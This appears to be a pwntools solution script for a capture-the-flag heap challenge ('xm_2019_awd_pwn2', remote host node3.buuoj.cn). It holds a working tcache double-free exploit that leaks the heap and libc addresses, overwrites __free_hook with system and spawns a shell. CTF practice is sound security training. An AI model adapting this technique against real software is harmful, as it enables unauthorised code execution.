import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./xm_2019_awd_pwn2')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			
			elf = ELF('./xm_2019_awd_pwn2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',29931)
			elf=ELF('./xm_2019_awd_pwn2')
			libc=ELF('../x64libc/libc.so.6')

		def add(size,note):
			io.sendlineafter('>>','1')
			io.sendlineafter('size:',str(size))
			io.sendlineafter('content:',note)

		def delete(idx):
			io.sendlineafter('>>','2')
			io.sendlineafter('idx:',str(idx))

		def show(idx):
			io.sendlineafter('>>','3')
			io.sendlineafter('idx:',str(idx))

		add(0xf0,'aaaa\n')
		add(0x20,'cccc\n')
		add(0x50,'/bin/sh\x00')
		delete(0)
		delete(0)
		show(0)
		heap_base=u64(io.recv(6)+'\x00\x00')-0x260
		add(0xf0,p64(heap_base+0x10)+'\n')
		add(0xf0,p64(heap_base+0x10)+'\n')
		add(0xf0,'\x00'*0xe+'\x07')
		delete(0)
		show(0)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		delete(1)
		delete(1)
		add(0x20,p64(libc.sym['__free_hook']))
		add(0x20,p64(libc.sym['__free_hook']))
		add(0x20,p64(libc.sym['system']))
		delete(2)




		success('heap_base:'+hex(heap_base))
		
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue
